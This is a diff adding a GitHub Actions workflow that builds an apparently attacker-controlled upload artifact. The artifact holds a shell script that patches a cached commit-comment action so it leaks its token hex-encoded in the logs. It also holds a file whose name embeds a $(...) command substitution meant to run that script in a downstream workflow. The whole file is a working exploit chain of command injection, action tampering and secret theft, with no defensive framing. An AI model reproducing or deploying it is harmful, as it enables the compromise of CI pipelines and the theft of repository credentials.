@@ -1,0 +1,32 @@
+name: Test
+
+on:
+  pull_request:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build attacker-controlled artifact
+        run: |
+          mkdir -p /tmp/content
+          printf 'benign report\n' > /tmp/content/report.txt
+          cat > /tmp/content/x.sh <<'EOS'
+          #!/bin/sh
+          exec 3>&1 1>&2
+          echo "RCE_MARKER uid=$(id) cwd=$(pwd)"
+          A="${RUNNER_WORKSPACE%/*}/_actions/peter-evans/commit-comment/v3/dist/index.js"
+          echo "TARGET=$A exists=$([ -f "$A" ] && echo yes || echo no)"
+          if [ -f "$A" ]; then
+            cp "$A" "$A.bak"
+            printf '\nconsole.log("STOLEN_HEX=" + Buffer.from(String(process.env.INPUT_TOKEN||"NONE"),"utf8").toString("hex"));\n' >> "$A"
+            echo "PATCHED_ACTION"
+          fi
+          exec 1>&3
+          echo report
+          EOS
+          touch '/tmp/content/$(cd ${HOME}; cd ..; cd ..; cd tmp; cd content; cd content; sh x.sh).txt'
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: /tmp/content
